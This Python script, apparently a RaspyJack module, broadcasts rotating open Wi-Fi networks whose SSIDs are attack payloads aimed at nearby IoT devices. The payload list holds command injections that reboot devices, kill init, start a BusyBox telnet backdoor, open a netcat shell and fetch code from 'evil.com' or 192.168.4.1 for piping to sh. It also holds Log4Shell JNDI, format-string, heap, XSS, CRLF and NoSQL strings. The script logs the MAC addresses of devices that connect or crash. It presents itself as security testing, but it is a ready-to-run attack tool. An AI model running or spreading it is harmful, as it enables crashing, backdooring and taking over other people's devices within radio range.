#!/usr/bin/env python3
# @name: CIW Zeroclick
# @desc: SSID Injection Testing Framework for IoT & WiFi device security assessment.
# @category: wifi
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- CIW Zeroclick
====================================
Author: 7h30th3r0n3

SSID Injection Testing Framework for IoT & WiFi device security assessment.
Broadcasts crafted SSID payloads to detect parsing vulnerabilities, buffer
overflows, and command injection flaws in nearby devices.

Based on CommandInWiFi-Zeroclick concept by V33RU.
Ported from Evil-M5Project (ESP32) to Raspyjack (Raspberry Pi).

Workflow:
  1) Select payload categories (14 categories, 157 payloads)
  2) Start broadcast — hostapd rotates SSIDs at configurable interval
  3) Monitor connecting devices via hostapd events
  4) Detect potential crashes (disconnect < 10s)
  5) View results (devices + crash alerts)

Controls:
  python3 ciw_zeroclick.py [interface] [rotation_seconds] [categories]

  interface        -- WiFi interface name. If omitted, you'll be
                       prompted to pick one from a numbered list
                       (auto-selected if only one is found).
  rotation_seconds  -- SSID rotation interval in seconds (default 5).
  categories        -- comma-separated category names to broadcast
                        (default: all). Pass "list" to print the
                        available category names and exit.

  Once running, status prints periodically (current SSID, devices
  connected, crash alerts). Ctrl-C stops the broadcast, prints a
  summary of devices and crash alerts, and exports results to loot.

Loot: $CITYPOP_ROOT/loot/CIW/
"""

from payloads._web_input import request_input
import os
import sys
import time
import json
import signal
import threading
import subprocess
import re
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_interfaces, supports_monitor

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'CIW')
PAYLOADS_FILE = os.path.join(LOOT_DIR, "payloads.json")
ALERTS_FILE = os.path.join(LOOT_DIR, "alerts.log")
HOSTAPD_CONF = "/tmp/rj_ciw_hostapd.conf"
DNSMASQ_CONF = "/tmp/rj_ciw_dnsmasq.conf"
GATEWAY_IP = "10.0.88.1"

# ---------------------------------------------------------------------------
# 14 payload categories with 157 payloads
# ---------------------------------------------------------------------------
CAT_NAMES = [
    "wifi_cmd", "wifi_overflow", "wifi_fmt", "wifi_probe", "wifi_esc",
    "wifi_serial", "wifi_enc", "wifi_chain", "wifi_heap", "wifi_xss",
    "wifi_path", "wifi_crlf", "wifi_jndi", "wifi_nosql",
]

DEFAULT_PAYLOADS = [
    # wifi_cmd (25)
    {"t": "|reboot|", "c": "wifi_cmd", "d": "Pipe operator reboot"},
    {"t": "&reboot&", "c": "wifi_cmd", "d": "Ampersand command chain"},
    {"t": "`reboot`", "c": "wifi_cmd", "d": "Backtick command substitution"},
    {"t": "$reboot$", "c": "wifi_cmd", "d": "Dollar-sign variable expansion"},
    {"t": ";reboot;", "c": "wifi_cmd", "d": "Semicolon command separator"},
    {"t": "$(reboot)", "c": "wifi_cmd", "d": "Subshell command substitution"},
    {"t": "|shutdown -r|", "c": "wifi_cmd", "d": "Pipe with shutdown"},
    {"t": "&cat /etc/passwd", "c": "wifi_cmd", "d": "Ampersand passwd read"},
    {"t": "reboot\\nreboot", "c": "wifi_cmd", "d": "Newline command injection"},
    {"t": "reboot\\r\\nreboot", "c": "wifi_cmd", "d": "CRLF command injection"},
    {"t": "|../../bin/sh|", "c": "wifi_cmd", "d": "Path traversal to shell"},
    {"t": "${IFS}reboot", "c": "wifi_cmd", "d": "IFS variable separator"},
    {"t": "*;reboot", "c": "wifi_cmd", "d": "Glob with command chain"},
    {"t": "$(echo reboot|sh)", "c": "wifi_cmd", "d": "Echo piped to shell"},
    {"t": "reboot\\x00ignored", "c": "wifi_cmd", "d": "Null byte truncation"},
    {"t": "|nc -lp 4444 -e sh|", "c": "wifi_cmd", "d": "Netcat reverse shell via pipe"},
    {"t": "&wget evil.com/x&", "c": "wifi_cmd", "d": "Download+execute via ampersand"},
    {"t": "$(curl evil.com)", "c": "wifi_cmd", "d": "Curl fetch via subshell"},
    {"t": "|id>/tmp/pwn|", "c": "wifi_cmd", "d": "Write id output to file"},
    {"t": "\\x00|reboot|", "c": "wifi_cmd", "d": "Null-prefix command injection"},
    {"t": "& ping -n 3 127.0.0.1 &", "c": "wifi_cmd", "d": "Windows cmd ping injection"},
    {"t": "|powershell -c reboot|", "c": "wifi_cmd", "d": "PowerShell command via pipe"},
    {"t": "`busybox reboot`", "c": "wifi_cmd", "d": "BusyBox-specific reboot"},
    {"t": "$(kill -9 1)", "c": "wifi_cmd", "d": "Kill init process PID 1"},
    {"t": "|/bin/busybox telnetd|", "c": "wifi_cmd", "d": "BusyBox telnet backdoor"},

    # wifi_overflow (26)
    {"t": "A" * 32, "c": "wifi_overflow", "d": "32-byte A fill"},
    {"t": "A" * 64, "c": "wifi_overflow", "d": "64-byte A fill"},
    {"t": "\\x41" * 16, "c": "wifi_overflow", "d": "16-byte hex 0x41 fill"},
    {"t": "\\x00" * 16, "c": "wifi_overflow", "d": "16-byte null fill"},
    {"t": "\\x7f" * 16, "c": "wifi_overflow", "d": "16-byte DEL fill"},
    {"t": "A" * 33, "c": "wifi_overflow", "d": "33-byte off-by-one"},
    {"t": "A" * 65, "c": "wifi_overflow", "d": "65-byte off-by-one"},
    {"t": "A" * 16 + "\\x00" + "A" * 15, "c": "wifi_overflow", "d": "Null-terminated boundary"},
    {"t": "A" * 28 + "\\r\\nAA", "c": "wifi_overflow", "d": "CRLF at boundary"},
    {"t": "\\xff" * 16, "c": "wifi_overflow", "d": "16-byte 0xFF fill"},
    {"t": "A" * 8 + "\\x00" * 4 + "A" * 8, "c": "wifi_overflow", "d": "Half-null padding"},
    {"t": "%s%s%s%s" + "A" * 28, "c": "wifi_overflow", "d": "Overflow + format write"},
    {"t": "DEAD" + "\\x41" * 12 + "DEAD", "c": "wifi_overflow", "d": "Canary markers DEAD"},
    {"t": "\\x41" * 4 + "\\x42" * 4 + "\\x43" * 4 + "\\x44" * 4, "c": "wifi_overflow", "d": "Address overwrite pattern"},
    {"t": "A" * 64 + "\\x00", "c": "wifi_overflow", "d": "64-byte + null terminator"},
    {"t": "A", "c": "wifi_overflow", "d": "Single byte"},
    {"t": "", "c": "wifi_overflow", "d": "Empty SSID"},
    {"t": " ", "c": "wifi_overflow", "d": "Single space SSID"},
    {"t": "A" * 30 + "%n", "c": "wifi_overflow", "d": "Overflow + format write %n"},
    {"t": "\\x80" * 16, "c": "wifi_overflow", "d": "High-bit byte fill"},
    {"t": "\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10", "c": "wifi_overflow", "d": "Sequential byte fill"},
    {"t": "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456", "c": "wifi_overflow", "d": "32-byte sequential ASCII"},
    {"t": "\\xfe\\xff" * 8, "c": "wifi_overflow", "d": "Alternating 0xFE/0xFF"},
    {"t": "\\x00" + "A" * 31, "c": "wifi_overflow", "d": "Null prefix + fill"},
    {"t": "A" * 31 + "\\x00", "c": "wifi_overflow", "d": "Fill + null suffix"},
    {"t": "\\xde\\xad\\xbe\\xef" * 4, "c": "wifi_overflow", "d": "DEADBEEF pattern repeat"},

    # wifi_fmt (15)
    {"t": "%s%s%s%s%s", "c": "wifi_fmt", "d": "Format string read crash"},
    {"t": "%n%n%n%n", "c": "wifi_fmt", "d": "Format string write"},
    {"t": "%x%x%x%x", "c": "wifi_fmt", "d": "Format hex leak"},
    {"t": "%p%p%p%p", "c": "wifi_fmt", "d": "Format pointer leak"},
    {"t": "%d%d%d%d%d%d", "c": "wifi_fmt", "d": "Format decimal overflow"},
    {"t": "AAAA%08x%08x%08x", "c": "wifi_fmt", "d": "Format with canary"},
    {"t": "%s" * 10, "c": "wifi_fmt", "d": "10x string deref"},
    {"t": "%x" * 16, "c": "wifi_fmt", "d": "16x hex leak"},
    {"t": "%08x.%08x.%08x.%08x", "c": "wifi_fmt", "d": "Dotted hex leak"},
    {"t": "%n" * 8, "c": "wifi_fmt", "d": "8x format write"},
    {"t": "%hn%hn%hn%hn", "c": "wifi_fmt", "d": "Half-word format write"},
    {"t": "%1$s%2$s%3$s", "c": "wifi_fmt", "d": "Positional string deref"},
    {"t": "%1$n%2$n", "c": "wifi_fmt", "d": "Positional write"},
    {"t": "%.9999d", "c": "wifi_fmt", "d": "Width overflow"},
    {"t": "%c" * 32, "c": "wifi_fmt", "d": "32x char print"},

    # wifi_probe (14)
    {"t": "", "c": "wifi_probe", "d": "Empty SSID probe"},
    {"t": " ", "c": "wifi_probe", "d": "Single space probe"},
    {"t": "\\x00", "c": "wifi_probe", "d": "Single null byte"},
    {"t": "\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08", "c": "wifi_probe", "d": "Control char fill"},
    {"t": "\\t\\n\\r\\t\\n\\r\\t\\n", "c": "wifi_probe", "d": "Whitespace controls"},
    {"t": "\\xe2\\x80\\x8b" * 3, "c": "wifi_probe", "d": "Zero-width spaces UTF-8"},
    {"t": "ValidSSID\\xff", "c": "wifi_probe", "d": "Trailing invalid byte"},
    {"t": "Test\\x00Hidden", "c": "wifi_probe", "d": "Null-embedded SSID"},
    {"t": "\\xef\\xbb\\xbfBOM_SSID", "c": "wifi_probe", "d": "UTF-8 BOM prefix"},
    {"t": "\\x1b[0m" * 4, "c": "wifi_probe", "d": "Escape sequence flood"},
    {"t": "\\xe2\\x80\\xaeSSID_SPOOF", "c": "wifi_probe", "d": "RTL override spoof"},
    {"t": "DIRECT-xx-SPOOF", "c": "wifi_probe", "d": "WiFi Direct prefix spoof"},
    {"t": "\\xc0\\x80" * 4, "c": "wifi_probe", "d": "Overlong null encoding"},
    {"t": "\\xed\\xa0\\x80" * 2, "c": "wifi_probe", "d": "Lone surrogate codepoints"},

    # wifi_esc (8)
    {"t": "\\x1b[2J\\x1b[H", "c": "wifi_esc", "d": "ANSI clear screen"},
    {"t": "\\x1b]0;HACKED\\x07", "c": "wifi_esc", "d": "OSC title set"},
    {"t": "\\x1b[6n", "c": "wifi_esc", "d": "Cursor position report"},
    {"t": "\\x1b[?47h", "c": "wifi_esc", "d": "Alt screen buffer"},
    {"t": "\\x1b[31mERROR\\x1b[0m", "c": "wifi_esc", "d": "Red colored fake log"},
    {"t": "\\x1b[1A\\x1b[2K", "c": "wifi_esc", "d": "Overwrite log line"},
    {"t": "\\x1b[32mroot@srv\\x1b[0m", "c": "wifi_esc", "d": "Fake root log"},
    {"t": "\\x1b[8m", "c": "wifi_esc", "d": "Hidden text mode"},

    # wifi_serial (13)
    {"t": '","admin":true,"x":"', "c": "wifi_serial", "d": "JSON key injection"},
    {"t": "</name><admin>1</admin>", "c": "wifi_serial", "d": "XML tag escape"},
    {"t": "'; DROP TABLE wifi;--", "c": "wifi_serial", "d": "SQLite injection"},
    {"t": '{"role":"admin"}', "c": "wifi_serial", "d": "JSON privilege escalation"},
    {"t": "key=val\\nnewsection", "c": "wifi_serial", "d": "INI newline injection"},
    {"t": "{{7*7}}", "c": "wifi_serial", "d": "Jinja template injection"},
    {"t": "<%= system('id') %>", "c": "wifi_serial", "d": "ERB template injection"},
    {"t": "${7*7}", "c": "wifi_serial", "d": "SSTI expression"},
    {"t": '=CMD("calc")', "c": "wifi_serial", "d": "Excel formula CMD"},
    {"t": "-1+1+cmd|'/C calc'!A0", "c": "wifi_serial", "d": "DDE minus prefix"},
    {"t": "+1+cmd|'/C calc'!A0", "c": "wifi_serial", "d": "DDE plus prefix"},
    {"t": "!!python/object/apply:os.system ['reboot']", "c": "wifi_serial", "d": "YAML deserialization"},
    {"t": 'O:8:"stdClass":0:{}', "c": "wifi_serial", "d": "PHP object deserialization"},

    # wifi_enc (8)
    {"t": "\\uff04(reboot)", "c": "wifi_enc", "d": "Fullwidth dollar normalization"},
    {"t": "\\uff5creboot\\uff5c", "c": "wifi_enc", "d": "Fullwidth pipe normalization"},
    {"t": "\\uff1breboot\\uff1b", "c": "wifi_enc", "d": "Fullwidth semicolon normalization"},
    {"t": "%7Creboot%7C", "c": "wifi_enc", "d": "URL-encoded pipe"},
    {"t": "%24(reboot)", "c": "wifi_enc", "d": "URL-encoded dollar"},
    {"t": "\\u0060reboot\\u0060", "c": "wifi_enc", "d": "JSON Unicode-escaped backtick"},
    {"t": "&vert;reboot&vert;", "c": "wifi_enc", "d": "HTML entity pipe"},
    {"t": "\\xc0\\xafetc\\xc0\\xafpasswd", "c": "wifi_enc", "d": "Overlong UTF-8 slash"},

    # wifi_chain (8)
    {"t": "$(", "c": "wifi_chain", "d": "Split subshell open"},
    {"t": "reboot)", "c": "wifi_chain", "d": "Split subshell close"},
    {"t": "|nc 192.168.4.1", "c": "wifi_chain", "d": "Split netcat addr"},
    {"t": "4444 -e /bin/sh|", "c": "wifi_chain", "d": "Split netcat port"},
    {"t": "%x%x%x%x_LEAK", "c": "wifi_chain", "d": "Format leak phase"},
    {"t": "%n%n_WRITE", "c": "wifi_chain", "d": "Format write phase"},
    {"t": "wget http://192.168", "c": "wifi_chain", "d": "Split wget URL"},
    {"t": ".4.1/x -O-|sh", "c": "wifi_chain", "d": "Split wget exec"},

    # wifi_heap (8)
    {"t": "\\x00" * 4 + "\\x11\\x00\\x00\\x00", "c": "wifi_heap", "d": "dlmalloc prev_size pattern"},
    {"t": "\\x41\\x00\\x00\\x00" * 2, "c": "wifi_heap", "d": "Fake chunk size"},
    {"t": "\\xde\\xad\\xbe\\xef", "c": "wifi_heap", "d": "DEADBEEF canary"},
    {"t": "\\x01" * 8, "c": "wifi_heap", "d": "Integer 1 spray"},
    {"t": "\\xfe" * 8, "c": "wifi_heap", "d": "Near-max byte spray"},
    {"t": "\\x00" * 8 + "\\x08\\x04\\x00\\x40", "c": "wifi_heap", "d": "Null sled + return addr"},
    {"t": "\\xba\\xad\\xf0\\x0d", "c": "wifi_heap", "d": "BAADF00D marker"},
    {"t": "\\x41" * 8 + "\\x00\\x00\\x00\\x41", "c": "wifi_heap", "d": "Heap spray + boundary"},

    # wifi_xss (8)
    {"t": "<script>alert(1)</script>", "c": "wifi_xss", "d": "Script tag alert"},
    {"t": "<img src=x onerror=alert(1)>", "c": "wifi_xss", "d": "Img onerror XSS"},
    {"t": "<svg onload=alert(1)>", "c": "wifi_xss", "d": "SVG onload"},
    {"t": "<body onload=alert(1)>", "c": "wifi_xss", "d": "Body onload"},
    {"t": "<details open ontoggle=alert(1)>", "c": "wifi_xss", "d": "Details ontoggle"},
    {"t": "<iframe src=javascript:alert(1)>", "c": "wifi_xss", "d": "Iframe injection"},
    {"t": "';alert(1)//", "c": "wifi_xss", "d": "JS string breakout"},
    {"t": "<marquee onstart=alert(1)>", "c": "wifi_xss", "d": "Marquee onstart"},

    # wifi_path (6)
    {"t": "../../../etc/shadow", "c": "wifi_path", "d": "Classic path traversal"},
    {"t": "..\\\\..\\\\..\\\\etc\\\\shadow", "c": "wifi_path", "d": "Double-dot bypass"},
    {"t": "%2e%2e%2f" * 3 + "etc%2fpasswd", "c": "wifi_path", "d": "URL-encoded traversal"},
    {"t": "/proc/self/environ", "c": "wifi_path", "d": "Proc environ read"},
    {"t": "..\\\\..\\\\..\\\\windows\\\\system32", "c": "wifi_path", "d": "Mixed separator Windows"},
    {"t": "/dev/urandom", "c": "wifi_path", "d": "Dev urandom read"},

    # wifi_crlf (6)
    {"t": "\\r\\nX-Injected: true", "c": "wifi_crlf", "d": "Custom header injection"},
    {"t": "%0d%0aSet-Cookie:pwned=1", "c": "wifi_crlf", "d": "URL-encoded cookie"},
    {"t": "\\r\\nLocation: http://evil", "c": "wifi_crlf", "d": "Redirect injection"},
    {"t": "\\r\\n\\r\\n<html>injected", "c": "wifi_crlf", "d": "Response splitting"},
    {"t": "\\r\\nTransfer-Encoding:chunked", "c": "wifi_crlf", "d": "Request smuggling"},
    {"t": "\\r\\nContent-Length:0\\r\\n\\r\\n", "c": "wifi_crlf", "d": "Content-Length injection"},

    # wifi_jndi (6)
    {"t": "${jndi:ldap://evil/x}", "c": "wifi_jndi", "d": "Log4Shell LDAP"},
    {"t": "${jndi:dns://evil/x}", "c": "wifi_jndi", "d": "JNDI DNS exfil"},
    {"t": "${env:AWS_SECRET}", "c": "wifi_jndi", "d": "Env variable leak"},
    {"t": "${sys:java.version}", "c": "wifi_jndi", "d": "System property leak"},
    {"t": "${jndi:rmi://evil/x}", "c": "wifi_jndi", "d": "JNDI RMI"},
    {"t": "${${lower:j}ndi:ldap://x}", "c": "wifi_jndi", "d": "Polyglot template probe"},

    # wifi_nosql (6)
    {"t": "admin' || '1'=='1", "c": "wifi_nosql", "d": "MongoDB $gt bypass"},
    {"t": '{"$ne":1}', "c": "wifi_nosql", "d": "MongoDB $ne injection"},
    {"t": '{"$regex":".*"}', "c": "wifi_nosql", "d": "MongoDB $regex match-all"},
    {"t": '{"$where":"sleep(5000)"}', "c": "wifi_nosql", "d": "MongoDB $where sleep"},
    {"t": "*)(objectClass=*)", "c": "wifi_nosql", "d": "LDAP wildcard filter"},
    {"t": "admin)(!(&(1=0", "c": "wifi_nosql", "d": "LDAP password bypass"},
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
_running = True
broadcasting = False
current_idx = 0
rotation_interval = 5  # seconds
selected_cats = {c: True for c in CAT_NAMES}  # all enabled
active_payloads = []
devices = []       # [{mac, connect_time, payload_idx}]
alerts = []        # [{mac, ssid, duration_ms, timestamp}]
status_msg = "Ready"

_hostapd_proc = None
_iface = None


def _cleanup_signal(*_):
    global _running
    _running = False


signal.signal(signal.SIGINT, _cleanup_signal)
signal.signal(signal.SIGTERM, _cleanup_signal)

# ---------------------------------------------------------------------------
# Payload management
# ---------------------------------------------------------------------------

def _ensure_payloads():
    """Create payloads.json if it doesn't exist."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    if not os.path.isfile(PAYLOADS_FILE):
        with open(PAYLOADS_FILE, "w") as f:
            json.dump(DEFAULT_PAYLOADS, f, indent=1)


def _load_payloads():
    """Load payloads filtered by selected categories."""
    global active_payloads
    try:
        with open(PAYLOADS_FILE, "r") as f:
            all_p = json.load(f)
    except Exception:
        all_p = list(DEFAULT_PAYLOADS)

    enabled = {c for c, on in selected_cats.items() if on}
    active_payloads = [p for p in all_p if p.get("c", "") in enabled]

# ---------------------------------------------------------------------------
# Broadcast engine
# ---------------------------------------------------------------------------

def _start_broadcast(iface):
    """Start hostapd AP with first payload SSID."""
    global _hostapd_proc, broadcasting, current_idx, devices, alerts, status_msg

    _load_payloads()
    if not active_payloads:
        with lock:
            status_msg = "No payloads selected!"
        return

    current_idx = 0
    devices = []
    alerts = []

    # Kill existing
    subprocess.run(["sudo", "pkill", "-f", "rj_ciw"], capture_output=True, timeout=5)
    time.sleep(0.3)

    # Configure interface
    for cmd in [
        ["sudo", "ip", "link", "set", iface, "down"],
        ["sudo", "iw", "dev", iface, "set", "type", "managed"],
        ["sudo", "ip", "link", "set", iface, "up"],
        ["sudo", "ip", "addr", "flush", "dev", iface],
        ["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", iface],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)

    ssid = active_payloads[0]["t"][:32] or "CIW_Test"

    with open(HOSTAPD_CONF, "w") as f:
        f.write(
            f"interface={iface}\ndriver=nl80211\nssid={ssid}\n"
            f"hw_mode=g\nchannel=6\nwmm_enabled=0\n"
            f"auth_algs=1\nwpa=0\nmax_num_sta=10\n"
        )

    _hostapd_proc = subprocess.Popen(
        ["sudo", "hostapd", HOSTAPD_CONF],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    )

    # Wait and check if hostapd started OK
    time.sleep(2)
    if _hostapd_proc.poll() is not None:
        # hostapd exited immediately - read error
        err = ""
        try:
            err = _hostapd_proc.stdout.read().decode("utf-8", errors="replace")[-200:]
        except Exception:
            pass
        with lock:
            status_msg = f"hostapd FAILED: {err[:40]}"
        _hostapd_proc = None
        return

    # Start event monitor thread
    threading.Thread(target=_monitor_hostapd_events, daemon=True).start()

    broadcasting = True
    with lock:
        status_msg = f"Broadcasting 1/{len(active_payloads)}"


def _stop_broadcast():
    """Stop broadcast and cleanup."""
    global _hostapd_proc, broadcasting, status_msg

    broadcasting = False
    if _hostapd_proc:
        _hostapd_proc.terminate()
        try:
            _hostapd_proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            _hostapd_proc.kill()
        _hostapd_proc = None

    subprocess.run(["sudo", "pkill", "-f", "rj_ciw"], capture_output=True, timeout=5)
    with lock:
        status_msg = "Stopped"


def _rotate_ssid(iface):
    """Change SSID to next payload by rewriting hostapd config and reloading."""
    global current_idx, _hostapd_proc

    current_idx = (current_idx + 1) % len(active_payloads)
    ssid = active_payloads[current_idx]["t"][:32] or "CIW_Test"

    with open(HOSTAPD_CONF, "w") as f:
        f.write(
            f"interface={iface}\ndriver=nl80211\nssid={ssid}\n"
            f"hw_mode=g\nchannel=6\nwmm_enabled=0\n"
            f"auth_algs=1\nwpa=0\nmax_num_sta=10\n"
        )

    # Reload hostapd by restarting
    if _hostapd_proc:
        _hostapd_proc.terminate()
        try:
            _hostapd_proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            _hostapd_proc.kill()

    _hostapd_proc = subprocess.Popen(
        ["sudo", "hostapd", HOSTAPD_CONF],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    )
    threading.Thread(target=_monitor_hostapd_events, daemon=True).start()

    with lock:
        status_msg = f"[{current_idx + 1}/{len(active_payloads)}] {ssid[:16]}"


def _monitor_hostapd_events():
    """Parse hostapd stdout for STA connect/disconnect events."""
    global devices, alerts
    proc = _hostapd_proc
    if not proc or not proc.stdout:
        return

    connect_times = {}  # mac -> time

    try:
        for raw_line in proc.stdout:
            if not _running or not broadcasting:
                break
            line = raw_line.decode("utf-8", errors="replace").strip()

            # AP-STA-CONNECTED aa:bb:cc:dd:ee:ff
            m = re.search(r"AP-STA-CONNECTED\s+([0-9a-fA-F:]{17})", line)
            if m:
                mac = m.group(1).upper()
                connect_times[mac] = time.time()
                with lock:
                    devices.append({
                        "mac": mac,
                        "connect_time": time.time(),
                        "payload_idx": current_idx,
                    })
                    if len(devices) > 50:
                        devices.pop(0)
                continue

            # AP-STA-DISCONNECTED aa:bb:cc:dd:ee:ff
            m = re.search(r"AP-STA-DISCONNECTED\s+([0-9a-fA-F:]{17})", line)
            if m:
                mac = m.group(1).upper()
                ct = connect_times.pop(mac, None)
                if ct:
                    duration_ms = int((time.time() - ct) * 1000)
                    if duration_ms < 10000:
                        ssid = active_payloads[current_idx]["t"][:32] if current_idx < len(active_payloads) else "?"
                        with lock:
                            alerts.append({
                                "mac": mac,
                                "ssid": ssid,
                                "duration_ms": duration_ms,
                                "timestamp": datetime.now().isoformat(),
                            })
                            if len(alerts) > 20:
                                alerts.pop(0)
                        # Log alert
                        try:
                            with open(ALERTS_FILE, "a") as f:
                                f.write(f"{datetime.now().isoformat()} CRASH {mac} {duration_ms}ms SSID={ssid}\n")
                        except Exception:
                            pass
    except Exception:
        pass

# ---------------------------------------------------------------------------
# WiFi interface selection
# ---------------------------------------------------------------------------

def _select_wifi_interface():
    """Detect WiFi interfaces and pick one. Prompts if more than one is found."""
    ifaces = list_interfaces(iface_type="wifi")

    if not ifaces:
        print("No WiFi interface found.", flush=True)
        return None

    if len(ifaces) == 1:
        return ifaces[0]["name"]

    print("Multiple WiFi interfaces found:", flush=True)
    for i, ifc in enumerate(ifaces):
        src = "USB" if not ifc["is_onboard"] else "onboard"
        caps = []
        if ifc["supports_ap"]:
            caps.append("AP")
        if ifc["supports_monitor"]:
            caps.append("mon")
        tag = f"{src} {'+'.join(caps)}" if caps else src
        state = "UP" if ifc["is_up"] else "DOWN"
        print(f"  [{i}] {ifc['name']}  {tag}  {state}", flush=True)

    while True:
        choice = request_input(f"Select interface [0-{len(ifaces) - 1}]: ").strip()
        if choice.isdigit() and 0 <= int(choice) < len(ifaces):
            return ifaces[int(choice)]["name"]
        print("Invalid selection, try again.", flush=True)


# ---------------------------------------------------------------------------
# Export results
# ---------------------------------------------------------------------------

def _export_results():
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"ciw_results_{ts}.json")
    with lock:
        data = {
            "devices": list(devices),
            "alerts": list(alerts),
            "active_payloads": len(active_payloads),
            "categories": [c for c, on in selected_cats.items() if on],
        }
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2)
    return path

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def _usage():
    print(f"Usage: {os.path.basename(__file__)} [interface] [rotation_seconds] [categories]", flush=True)
    print("  interface         WiFi interface name (prompted if omitted)", flush=True)
    print("  rotation_seconds  SSID rotation interval in seconds (default 5)", flush=True)
    print("  categories        comma-separated category names, or 'all' (default all)", flush=True)
    print("                    pass 'list' as the interface arg to print category names", flush=True)
    print(f"  Categories: {', '.join(CAT_NAMES)}", flush=True)


def main():
    global _running, broadcasting, rotation_interval, selected_cats, _iface
    global current_idx

    args = sys.argv[1:]
    if args and args[0] in ("-h", "--help"):
        _usage()
        return 0
    if args and args[0] == "list":
        print("Available categories:", flush=True)
        for c in CAT_NAMES:
            print(f"  {c}", flush=True)
        return 0

    _ensure_payloads()

    iface_arg = args[0] if len(args) >= 1 else None
    rotation_arg = args[1] if len(args) >= 2 else None
    cats_arg = args[2] if len(args) >= 3 else None

    if rotation_arg:
        try:
            rotation_interval = max(1, int(rotation_arg))
        except ValueError:
            print(f"Invalid rotation_seconds: {rotation_arg}", flush=True)
            return 1

    if cats_arg and cats_arg.lower() != "all":
        requested = {c.strip() for c in cats_arg.split(",") if c.strip()}
        unknown = requested - set(CAT_NAMES)
        if unknown:
            print(f"Unknown categories: {', '.join(sorted(unknown))}", flush=True)
            return 1
        selected_cats = {c: (c in requested) for c in CAT_NAMES}

    _iface = iface_arg or _select_wifi_interface()
    if not _iface:
        print("No WiFi interface available.", flush=True)
        return 1

    n_selected = sum(1 for v in selected_cats.values() if v)
    print(f"Interface: {_iface}", flush=True)
    print(f"Categories: {n_selected}/{len(CAT_NAMES)} selected", flush=True)
    print(f"Rotation interval: {rotation_interval}s", flush=True)

    threading.Thread(target=_start_broadcast, args=(_iface,), daemon=True).start()

    # Wait for broadcast to actually start (or fail)
    for _ in range(60):
        with lock:
            started = broadcasting
            msg = status_msg
        if started or "FAILED" in msg or "No payloads" in msg:
            break
        time.sleep(0.1)

    with lock:
        started = broadcasting
        msg = status_msg
    print(msg, flush=True)
    if not started:
        return 1

    print("Broadcasting. Press Ctrl-C to stop.", flush=True)
    last_rotation = time.time()
    start_time = time.time()

    try:
        while _running:
            time.sleep(0.5)
            if broadcasting and active_payloads and _iface:
                if time.time() - last_rotation >= rotation_interval:
                    _rotate_ssid(_iface)
                    last_rotation = time.time()

            if time.time() - start_time >= 1.0 and int(time.time() - start_time) % 5 == 0:
                with lock:
                    msg = status_msg
                    dc = len(devices)
                    ac = len(alerts)
                elapsed = time.time() - start_time
                print(f"[{elapsed:6.1f}s] {msg}  devices={dc} alerts={ac}", flush=True)
                time.sleep(1.0)  # avoid duplicate prints within the same second
    except KeyboardInterrupt:
        print("\nStopping broadcast...", flush=True)

    _running = False
    if broadcasting:
        _stop_broadcast()

    with lock:
        devs = list(devices)
        als = list(alerts)

    print(f"\nSummary: {len(devs)} device(s) connected, {len(als)} crash alert(s).", flush=True)
    if devs:
        print("Devices:", flush=True)
        for d in devs:
            idx = d.get("payload_idx", 0)
            ssid = active_payloads[idx]["t"][:32] if idx < len(active_payloads) else "?"
            print(f"  {d['mac']}  ssid={ssid}", flush=True)
    if als:
        print("Crash alerts:", flush=True)
        for a in als:
            print(f"  {a['mac']}  ssid={a['ssid']}  duration={a['duration_ms']}ms  ts={a['timestamp']}", flush=True)

    path = _export_results()
    print(f"\nResults exported to {path}", flush=True)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
